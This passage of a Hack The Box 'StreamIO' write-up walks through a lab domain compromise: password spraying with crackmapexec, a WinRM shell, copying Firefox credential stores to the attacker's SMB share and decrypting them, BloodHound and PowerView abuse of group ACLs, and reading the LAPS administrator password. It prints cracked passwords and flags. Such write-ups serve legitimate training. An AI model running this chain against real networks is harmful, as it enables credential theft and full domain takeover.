nikk37:389d14cb8e4e9b94b137deb1caf0612a:get_dem_girls2@yahoo.com
yoshihide:b779ba15cedfd22a023c4d8bcf5f2332:66boysandgirls..
Lauren:08344b85b329d7efd611b7a7743e8a09:##123a8j8w5123##
Sabrina:f87d3c0d6c8fd686aacc6627f1f493a5:!!sabrina$
```

Then like before, I try again for SMB with crackmapexec.

```bash
ghost@localhost [02:52:46] [~/Documents/hacking/hackthebox/streamio] [master *]
-> % crackmapexec smb 10.10.11.158 -u user -p pass --no-bruteforce --continue-on-success
SMB         10.10.11.158    445    DC               [*] Windows 10.0 Build 17763 x64 (name:DC) (domain:streamIO.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.158    445    DC               [-] streamIO.htb\admin:paddpadd STATUS_LOGON_FAILURE
SMB         10.10.11.158    445    DC               [-] streamIO.htb\Barry:$hadoW STATUS_LOGON_FAILURE
SMB         10.10.11.158    445    DC               [-] streamIO.htb\Bruno:$monique$1991$ STATUS_LOGON_FAILURE
SMB         10.10.11.158    445    DC               [-] streamIO.htb\Clara:%$clara STATUS_LOGON_FAILURE
SMB         10.10.11.158    445    DC               [-] streamIO.htb\Juliette:$3xybitch STATUS_LOGON_FAILURE
SMB         10.10.11.158    445    DC               [-] streamIO.htb\Lauren:##123a8j8w5123## STATUS_LOGON_FAILURE
SMB         10.10.11.158    445    DC               [-] streamIO.htb\Lenord:physics69i STATUS_LOGON_FAILURE
SMB         10.10.11.158    445    DC               [-] streamIO.htb\Michelle:!?Love?!123 STATUS_LOGON_FAILURE
SMB         10.10.11.158    445    DC               [-] streamIO.htb\Sabrina:!!sabrina$ STATUS_LOGON_FAILURE
SMB         10.10.11.158    445    DC               [-] streamIO.htb\Thane:highschoolmusical STATUS_LOGON_FAILURE
SMB         10.10.11.158    445    DC               [-] streamIO.htb\Victoria:!5psycho8! STATUS_LOGON_FAILURE
SMB         10.10.11.158    445    DC               [-] streamIO.htb\yoshihide:66boysandgirls.. STATUS_LOGON_FAILURE
SMB         10.10.11.158    445    DC               [+] streamIO.htb\nikk37:get_dem_girls2@yahoo.com
```

The user `nikk37` works so I try on `WinRM`.

```bash
ghost@localhost [02:53:32] [~/Documents/hacking/hackthebox/streamio] [master *]
-> % crackmapexec winrm 10.10.11.158 -u nikk37 -p 'get_dem_girls2@yahoo.com'
SMB         10.10.11.158    5985   NONE             [*] None (name:10.10.11.158) (domain:None)
HTTP        10.10.11.158    5985   NONE             [*] http://10.10.11.158:5985/wsman
WINRM       10.10.11.158    5985   NONE             [+] None\nikk37:get_dem_girls2@yahoo.com (Pwn3d!)
WINRM       10.10.11.158    5985   NONE             [-] None\nikk37:get_dem_girls2@yahoo.com "'NoneType' object has no attribute 'upper'"
```

So I use **evil-winrm** to connect.

```bash
ghost@localhost [02:53:45] [~/Documents/hacking/hackthebox/streamio] [master *]
-> % evil-winrm -u nikk37 -p 'get_dem_girls2@yahoo.com' -i 10.10.11.158
zsh: /usr/local/bin/evil-winrm: bad interpreter: /usr/bin/ruby2.7: no such file or directory

Evil-WinRM shell v3.4

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine

Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\nikk37\Documents>

...

*Evil-WinRM* PS C:\Users\nikk37\Desktop> type user.txt
de0cbcde283122c5354819fc57f5cff8
```

One unsual program for HTB machines is firefox.

```bash
PS C:\Program Files (x86)> dir


    Directory: C:\Program Files (x86)


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----        9/15/2018  12:28 AM                Common Files
d-----        2/25/2022  11:35 PM                IIS
...
d-----        5/26/2022   4:09 PM                Mozilla Firefox
...
```

So I checked the compromised user, `nikk37` firefox profiles.

```bash
*Evil-WinRM* PS C:\Users\nikk37\AppData\roaming\mozilla\Firefox\Profiles> ls


    Directory: C:\Users\nikk37\AppData\roaming\mozilla\Firefox\Profiles


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----        2/22/2022   2:40 AM                5rwivk2l.default
d-----        2/22/2022   2:42 AM                br53rxeg.default-release


*Evil-WinRM* PS C:\Users\nikk37\AppData\roaming\mozilla\Firefox\Profiles> cd br53rxeg.default-release


*Evil-WinRM* PS C:\Users\nikk37\AppData\roaming\mozilla\Firefox\Profiles\br53rxeg.default-release> ls


    Directory: C:\Users\nikk37\AppData\roaming\mozilla\Firefox\Profiles\br53rxeg.default-release


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----        2/22/2022   2:40 AM                bookmarkbackups
d-----        2/22/2022   2:40 AM                browser-extension-data
d-----        2/22/2022   2:41 AM                crashes
d-----        2/22/2022   2:42 AM                datareporting
d-----        2/22/2022   2:40 AM                minidumps
d-----        2/22/2022   2:42 AM                saved-telemetry-pings
d-----        2/22/2022   2:40 AM                security_state
d-----        2/22/2022   2:42 AM                sessionstore-backups
d-----        2/22/2022   2:40 AM                storage
-a----        2/22/2022   2:40 AM             24 addons.json
-a----        2/22/2022   2:42 AM           5189 addonStartup.json.lz4
-a----        2/22/2022   2:42 AM            310 AlternateServices.txt
-a----        2/22/2022   2:41 AM         229376 cert9.db
-a----        2/22/2022   2:40 AM            208 compatibility.ini
-a----        2/22/2022   2:40 AM            939 containers.json
-a----        2/22/2022   2:40 AM         229376 content-prefs.sqlite
-a----        2/22/2022   2:40 AM          98304 cookies.sqlite
-a----        2/22/2022   2:40 AM           1081 extension-preferences.json
-a----        2/22/2022   2:40 AM          43726 extensions.json
-a----        2/22/2022   2:42 AM        5242880 favicons.sqlite
-a----        2/22/2022   2:41 AM         262144 formhistory.sqlite
-a----        2/22/2022   2:40 AM            778 handlers.json
-a----        2/22/2022   2:40 AM         294912 key4.db
-a----        2/22/2022   2:41 AM           1593 logins-backup.json
-a----        2/22/2022   2:41 AM           2081 logins.json
-a----        2/22/2022   2:42 AM              0 parent.lock
-a----        2/22/2022   2:42 AM          98304 permissions.sqlite
-a----        2/22/2022   2:40 AM            506 pkcs11.txt
-a----        2/22/2022   2:42 AM        5242880 places.sqlite
-a----        2/22/2022   2:42 AM           8040 prefs.js
-a----        2/22/2022   2:42 AM            180 search.json.mozlz4
-a----        2/22/2022   2:42 AM            288 sessionCheckpoints.json
-a----        2/22/2022   2:42 AM           1853 sessionstore.jsonlz4
-a----        2/22/2022   2:40 AM             18 shield-preference-experiments.json
-a----        2/22/2022   2:42 AM            611 SiteSecurityServiceState.txt
-a----        2/22/2022   2:42 AM           4096 storage.sqlite
-a----        2/22/2022   2:40 AM             50 times.json
-a----        2/22/2022   2:40 AM          98304 webappsstore.sqlite
-a----        2/22/2022   2:42 AM            141 xulstore.json
```

I start SMB server.

```bash
ghost@localhost [03:15:33] [~/Documents/hacking/hackthebox/streamio] [master *]
-> % smbserver.py share . -user ghost -pass ghost -smb2support
Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Config file parsed
```

Then copy `key4.db` and `logins.json` to crack later.

```bash
*Evil-WinRM* PS C:\Users\nikk37\AppData\roaming\mozilla\Firefox\Profiles\br53rxeg.default-release> net use \\10.10.14.11\share /u:ghost ghost
The command completed successfully.

*Evil-WinRM* PS C:\Users\nikk37\AppData\roaming\mozilla\Firefox\Profiles\br53rxeg.default-release> copy key4.db \\10.10.14.11\share\
*Evil-WinRM* PS C:\Users\nikk37\AppData\roaming\mozilla\Firefox\Profiles\br53rxeg.default-release> copy logins.json \\10.10.14.11\share\
```

Then I use firepwd (https://github.com/lclevy/firepwd).

```bash
ghost@localhost [03:20:39] [~/Documents/hacking/hackthebox/streamio/firefox] [master *]
-> % firepwd
globalSalt: b'd215c391179edb56af928a06c627906bcbd4bd47'
 SEQUENCE {
   SEQUENCE {
     OBJECTIDENTIFIER 1.2.840.113549.1.5.13 pkcs5 pbes2
     SEQUENCE {
       SEQUENCE {
         OBJECTIDENTIFIER 1.2.840.113549.1.5.12 pkcs5 PBKDF2
         SEQUENCE {
           OCTETSTRING b'5d573772912b3c198b1e3ee43ccb0f03b0b23e46d51c34a2a055e00ebcd240f5'
           INTEGER b'01'
           INTEGER b'20'
           SEQUENCE {
             OBJECTIDENTIFIER 1.2.840.113549.2.9 hmacWithSHA256
           }
         }
       }
       SEQUENCE {
         OBJECTIDENTIFIER 2.16.840.1.101.3.4.1.42 aes256-CBC
         OCTETSTRING b'1baafcd931194d48f8ba5775a41f'
       }
     }
   }
   OCTETSTRING b'12e56d1c8458235a4136b280bd7ef9cf'
 }
clearText b'70617373776f72642d636865636b0202'
password check? True
 SEQUENCE {
   SEQUENCE {
     OBJECTIDENTIFIER 1.2.840.113549.1.5.13 pkcs5 pbes2
     SEQUENCE {
       SEQUENCE {
         OBJECTIDENTIFIER 1.2.840.113549.1.5.12 pkcs5 PBKDF2
         SEQUENCE {
           OCTETSTRING b'098560d3a6f59f76cb8aad8b3bc7c43d84799b55297a47c53d58b74f41e5967e'
           INTEGER b'01'
           INTEGER b'20'
           SEQUENCE {
             OBJECTIDENTIFIER 1.2.840.113549.2.9 hmacWithSHA256
           }
         }
       }
       SEQUENCE {
         OBJECTIDENTIFIER 2.16.840.1.101.3.4.1.42 aes256-CBC
         OCTETSTRING b'e28a1fe8bcea476e94d3a722dd96'
       }
     }
   }
   OCTETSTRING b'51ba44cdd139e4d2b25f8d94075ce3aa4a3d516c2e37be634d5e50f6d2f47266'
 }
clearText b'b3610ee6e057c4341fc76bc84cc8f7cd51abfe641a3eec9d0808080808080808'
decrypting login/password pairs
https://slack.streamio.htb:b'admin',b'JDg0dd1s@d0p3cr3@t0r'
https://slack.streamio.htb:b'nikk37',b'n1kk1sd0p3t00:)'
https://slack.streamio.htb:b'yoshihide',b'paddpadd@12'
https://slack.streamio.htb:b'JDgodd',b'password@12'
```

Found 4 passwords.
- admin:JDg0dd1s@d0p3cr3@t0r
- nikk37:n1kk1sd0p3t00:)
- yoshihide:paddpadd@12
- JDgodd:password@12

I try with `crackmapexec` and all failed.

```bash
ghost@localhost [03:24:33] [~/Documents/hacking/hackthebox/streamio/credentials] [master *]
-> % crackmapexec smb 10.10.11.158 -u slack-users -p slack-pass --continue-on-success --no-bruteforce
SMB         10.10.11.158    445    DC               [*] Windows 10.0 Build 17763 x64 (name:DC) (domain:streamIO.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.158    445    DC               [-] streamIO.htb\admin:JDg0dd1s@d0p3cr3@t0r STATUS_LOGON_FAILURE
SMB         10.10.11.158    445    DC               [-] streamIO.htb\nikk37:n1kk1sd0p3t00:) STATUS_LOGON_FAILURE
SMB         10.10.11.158    445    DC               [-] streamIO.htb\yoshihide:paddpadd@12 STATUS_LOGON_FAILURE
SMB         10.10.11.158    445    DC               [-] streamIO.htb\JDgodd:password@12 STATUS_LOGON_FAILURE
```

I try again with bruteforce to see different combinations.

```bash
ghost@localhost [03:24:51] [~/Documents/hacking/hackthebox/streamio/credentials] [master *]
-> % crackmapexec smb 10.10.11.158 -u slack-users -p slack-pass --continue-on-success
SMB         10.10.11.158    445    DC               [*] Windows 10.0 Build 17763 x64 (name:DC) (domain:streamIO.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.158    445    DC               [-] streamIO.htb\admin:JDg0dd1s@d0p3cr3@t0r STATUS_LOGON_FAILURE
SMB         10.10.11.158    445    DC               [-] streamIO.htb\admin:n1kk1sd0p3t00:) STATUS_LOGON_FAILURE
SMB         10.10.11.158    445    DC               [-] streamIO.htb\admin:paddpadd@12 STATUS_LOGON_FAILURE
SMB         10.10.11.158    445    DC               [-] streamIO.htb\admin:password@12 STATUS_LOGON_FAILURE
SMB         10.10.11.158    445    DC               [-] streamIO.htb\nikk37:JDg0dd1s@d0p3cr3@t0r STATUS_LOGON_FAILURE
SMB         10.10.11.158    445    DC               [-] streamIO.htb\nikk37:n1kk1sd0p3t00:) STATUS_LOGON_FAILURE
SMB         10.10.11.158    445    DC               [-] streamIO.htb\nikk37:paddpadd@12 STATUS_LOGON_FAILURE
SMB         10.10.11.158    445    DC               [-] streamIO.htb\nikk37:password@12 STATUS_LOGON_FAILURE
SMB         10.10.11.158    445    DC               [-] streamIO.htb\yoshihide:JDg0dd1s@d0p3cr3@t0r STATUS_LOGON_FAILURE
SMB         10.10.11.158    445    DC               [-] streamIO.htb\yoshihide:n1kk1sd0p3t00:) STATUS_LOGON_FAILURE
SMB         10.10.11.158    445    DC               [-] streamIO.htb\yoshihide:paddpadd@12 STATUS_LOGON_FAILURE
SMB         10.10.11.158    445    DC               [-] streamIO.htb\yoshihide:password@12 STATUS_LOGON_FAILURE
SMB         10.10.11.158    445    DC               [+] streamIO.htb\JDgodd:JDg0dd1s@d0p3cr3@t0r
SMB         10.10.11.158    445    DC               [-] streamIO.htb\JDgodd:n1kk1sd0p3t00:) STATUS_LOGON_FAILURE
SMB         10.10.11.158    445    DC               [-] streamIO.htb\JDgodd:paddpadd@12 STATUS_LOGON_FAILURE
SMB         10.10.11.158    445    DC               [-] streamIO.htb\JDgodd:password@12 STATUS_LOGON_FAILURE
```

JDgodd:JDg0dd1s@d0p3cr3@t0r works. However, it does not have Windows remote desktop.

```bash
ghost@localhost [03:27:30] [~/Documents/hacking/hackthebox/streamio/credentials] [master *]
-> % crackmapexec winrm 10.10.11.158 -u JDgodd -p 'JDg0dd1s@d0p3cr3@t0r'
SMB         10.10.11.158    5985   NONE             [*] None (name:10.10.11.158) (domain:None)
HTTP        10.10.11.158    5985   NONE             [*] http://10.10.11.158:5985/wsman
WINRM       10.10.11.158    5985   NONE             [-] None\JDgodd:JDg0dd1s@d0p3cr3@t0r
```

I use bloodhound-python (https://github.com/fox-it/BloodHound.py) to collect Active Directory data.

```bash
ghost@localhost [03:30:38] [~/Documents/hacking/hackthebox/streamio] [master *]
-> % bloodhound-python -c All -u jdgodd -p 'JDg0dd1s@d0p3cr3@t0r' -ns 10.10.11.158 -d streamio.htb -dc streamio.htb --zip
INFO: Found AD domain: streamio.htb
INFO: Getting TGT for user
WARNING: Failed to get Kerberos TGT. Falling back to NTLM authentication. Error: Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)
INFO: Connecting to LDAP server: streamio.htb
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 1 computers
INFO: Connecting to LDAP server: streamio.htb
INFO: Found 8 users
INFO: Found 54 groups
INFO: Found 4 gpos
INFO: Found 1 ous
INFO: Found 19 containers
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: DC.streamIO.htb
INFO: Done in 01M 27S
INFO: Compressing output into 20221202033043_bloodhound.zip
```

Start Neo4j

```bash
ghost@localhost [03:32:22] [~/Documents/hacking/hackthebox/streamio] [master *]
-> % sudo neo4j console
[sudo] password for ghost:
Directories in use:
home:         /usr/share/neo4j
config:       /usr/share/neo4j/conf
logs:         /usr/share/neo4j/logs
plugins:      /usr/share/neo4j/plugins
import:       /usr/share/neo4j/import
data:         /usr/share/neo4j/data
certificates: /usr/share/neo4j/certificates
licenses:     /usr/share/neo4j/licenses
run:          /usr/share/neo4j/run
Starting Neo4j.
```

Then upload the zip file to Bloodhound.

### Bloodhound 

- From Bloodhound, I can see `JDGODD` has ownership and `WriteOwner` on the Core staff group.
- Core Staff has `READLAPSPassword` on the DC computer object

![](./streamio_bloodhound.png)

Upload `PowerView.ps1`

```bash
*Evil-WinRM* PS C:\Users\nikk37> cd C:\programdata
*Evil-WinRM* PS C:\programdata> upload PowerView.ps1
Info: Uploading PowerView.ps1 to C:\programdata\PowerView.ps1


Data: 1027036 bytes of 1027036 bytes copied

Info: Upload successful!

*Evil-WinRM* PS C:\programdata> . .\PowerView.ps1
```

Then create credential object for JDgodd, then add the user to Core Staff.

```bash
*Evil-WinRM* PS C:\programdata> $pass = ConvertTo-SecureString 'JDg0dd1s@d0p3cr3@t0r' -AsPlainText -Force

*Evil-WinRM* PS C:\programdata> $cred = New-Object System.Management.Automation.PSCredential('streamio.htb\JDgodd', $pass)

*Evil-WinRM* PS C:\programdata> Add-DomainObjectAcl -Credential $cred -TargetIdentity "Core Staff" -PrincipalIdentity "streamio\JDgodd"

*Evil-WinRM* PS C:\programdata> Add-DomainGroupMember -Credential $cred -Identity "Core Staff" -Members "StreamIO\JDgodd"

*Evil-WinRM* PS C:\programdata> net user jdgodd
User name                    JDgodd
Full Name
Comment
User's comment
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            2/22/2022 1:56:42 AM
Password expires             Never
Password changeable          2/23/2022 1:56:42 AM
Password required            Yes
User may change password     Yes

Workstations allowed         All
Logon script
User profile
Home directory
Last logon                   12/2/2022 1:49:25 AM

Logon hours allowed          All

Local Group Memberships
Global Group memberships     *Domain Users         *CORE STAFF
The command completed successfully.
```

Then I read LAPS passwords from `ms-MCS-AdmPwd` property of the computer object.

```bash
*Evil-WinRM* PS C:\programdata> Get-AdComputer -Filter * -Properties ms-Mcs-AdmPwd -Credential $cred


DistinguishedName : CN=DC,OU=Domain Controllers,DC=streamIO,DC=htb
DNSHostName       : DC.streamIO.htb
Enabled           : True
ms-Mcs-AdmPwd     : s,2RZk{h{bXq8)
Name              : DC
ObjectClass       : computer
ObjectGUID        : 8c0f9a80-aaab-4a78-9e0d-7a4158d8b9ee
SamAccountName    : DC$
SID               : S-1-5-21-1470860369-1569627196-4264678630-1000
UserPrincipalName :
```

It can also be done via `crackmapexec`.

```bash
ghost@localhost [11:57:34] [~/Documents/hacking/hackthebox/streamio] [master *]
-> % crackmapexec smb 10.10.11.158 -u JDgodd -p JDg0dd1s@d0p3cr3@t0r --laps --ntds
SMB         10.10.11.158    445    DC               [*] Windows 10.0 Build 17763 x64 (name:DC) (domain:streamIO.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.158    445    DC               [-] DC\administrator:s,2RZk{h{bXq8) STATUS_LOGON_FAILURE
```

Then I can login as `administrator`.

```bash
ghost@localhost [11:58:37] [~/Documents/hacking/hackthebox/streamio] [master *]
-> % evil-winrm -u administrator -p 's,2RZk{h{bXq8)' -i 10.10.11.158
zsh: /usr/local/bin/evil-winrm: bad interpreter: /usr/bin/ruby2.7: no such file or directory

Evil-WinRM shell v3.4

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine

Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\Administrator\Documents> cd ../..
*Evil-WinRM* PS C:\Users> cd Martin\desktop
*Evil-WinRM* PS C:\Users\Martin\desktop> type root.txt
f7e3cfe1af5df2f7df33a113019028ad
```
